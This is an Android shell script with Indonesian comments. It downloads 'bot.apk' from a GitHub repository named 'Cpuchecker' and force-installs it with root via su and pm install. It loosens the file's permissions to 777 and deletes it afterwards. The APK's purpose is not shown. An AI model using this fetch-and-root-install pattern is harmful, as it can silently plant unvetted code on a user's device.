#!/system/bin/sh

# --- BANNER DRAG ---
echo "  ____   ____        _     ____ "
echo " |  _ \ |  _ \      / \   / ___|"
echo " | | | || |_) |    / _ \ | |  _ "
echo " | |_| ||  _ <    / ___ \| |_| |"
echo " |____/ |_| \_\  /_/   \_\\____|"
echo "      [ MODE: ROOT ACTIVE ]"
echo "------------------------------------"

# --- KONFIGURASI ---
LINK="https://raw.githubusercontent.com/gajelasfefek-afk/Cpuchecker/refs/heads/main/bot.apk"
# Kita simpen di folder temporary sistem biar gak ditolak permission
DEST="/data/local/tmp/bot.apk"

echo "[*] Mendownload APK ke jalur sistem..."
curl -L -o "$DEST" "$LINK"

if [ -f "$DEST" ]; then
    echo "[+] File mendarat di $DEST"
    echo "[-] Menjalankan Paksa Instalasi (Root)..."
    
    # Cara paling ampuh: Panggil 'pm install' lewat 'su'
    # Kita tambahin 'chmod' biar filenya bisa dibaca sistem
    su -c "chmod 777 $DEST && pm install -r $DEST"
    
    if [ $? -eq 0 ]; then
        echo "[!] BOOM! INSTALL SUCCESS, DRAG!"
        su -c "rm $DEST"
    else
        echo "[X] GAGAL TOTAL! Cek apakah notif Root muncul di layar?"
    fi
else
    echo "[X] DOWNLOAD GAGAL! Cek koneksi lu, Cuk."
fi

echo "------------------------------------"
